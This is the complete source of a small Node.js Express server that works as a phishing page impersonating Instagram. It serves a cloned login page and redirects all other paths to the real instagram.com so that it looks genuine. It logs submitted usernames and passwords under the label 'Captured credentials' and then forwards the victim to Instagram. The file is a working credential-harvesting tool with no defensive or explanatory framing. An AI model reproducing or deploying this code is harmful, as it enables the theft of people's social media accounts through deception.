const express = require('express')
const app = express()
const bodyParser = require('body-parser')

app.use(bodyParser.urlencoded({
    extended: false
}))

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/templates/login.html")
})

app.get("/*", (req, res) => {
    res.redirect("https://instagram.com" + req.url)
})

app.post("/creds", (req, res) => {
    const username = req.body.username
    const password = req.body.password
    console.log(`[+] Captured credentials::: Username: ${username}; Password: ${password}`)
    res.redirect("https://www.instagram.com/")
})

app.post("/ajax/*", (req, res) => {
    res.json({
        "status": "ok"
    })
})

app.options("/*")

app.listen(9999, () => {
    console.log("Started server on port 9999!")
})